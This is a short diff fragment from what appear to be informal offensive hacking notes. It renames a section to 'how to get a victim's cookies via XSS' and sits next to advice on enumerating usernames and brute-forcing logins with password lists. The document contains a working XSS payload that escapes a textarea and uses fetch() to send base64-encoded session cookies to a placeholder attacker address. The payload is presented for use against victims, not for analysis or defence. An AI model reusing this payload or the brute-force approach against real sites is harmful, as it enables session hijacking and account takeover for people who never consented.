@@ -86,5 +86,5 @@ HOW TO ENUMERATE USERS THAT ALREADY EXISTS
 BIG BRAINED
 -you can the create a list usernames and brute force ur way in with a password list
 ________________________________________________________________________________
-HOW TO RUN REVERSE SHELL VIA XSS:
+HOW TO GET A VICTIM'S COOKIES VIA XSS:
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
